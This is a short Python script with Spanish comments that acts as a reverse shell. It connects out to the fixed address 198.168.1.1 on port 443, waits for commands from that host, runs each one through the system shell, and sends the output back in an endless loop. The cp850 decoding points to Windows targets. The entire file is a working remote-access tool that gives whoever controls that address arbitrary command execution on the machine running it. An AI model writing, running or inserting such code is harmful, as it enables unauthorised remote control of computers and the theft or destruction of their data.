#!/usr/bin/env python3

import socket
import subprocess

def run_command(command):

    command_output = subprocess.check_output(command, shell=True)
    return command_output.decode("cp850")

    
if __name__ == '__main__':
    # Creamos un socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Nos conectamos al servidor en el puerto 443
    client_socket.connect(("198.168.1.1", 443))

    while True:
        command = client_socket.recv(1024).decode().strip()
        command_output = run_command(command)

        client_socket.send(b"\n" + command_output.encode() + b"\n\n")
   
    client_socket.close()

